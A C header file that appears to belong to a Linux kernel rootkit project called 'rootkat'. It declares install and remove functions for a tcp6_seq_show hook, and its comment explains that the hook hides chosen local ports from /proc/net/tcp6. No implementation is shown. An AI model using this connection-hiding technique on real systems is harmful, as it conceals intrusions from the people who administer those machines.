/* SPDX-License-Identifier: MIT */
#ifndef ROOTKAT_HOOK_TCP6_SEQ_SHOW_H
#define ROOTKAT_HOOK_TCP6_SEQ_SHOW_H

/*
 * tcp6_seq_show hook — IPv6 counterpart of tcp4_seq_show. Filters
 * /proc/net/tcp6 entries whose local port is in the hidden-ports
 * registry. Same hidden_ports list as IPv4; an entry hides the port
 * across both families.
 */
int rootkat_hook_tcp6_seq_show_install(void);
void rootkat_hook_tcp6_seq_show_remove(void);

#endif
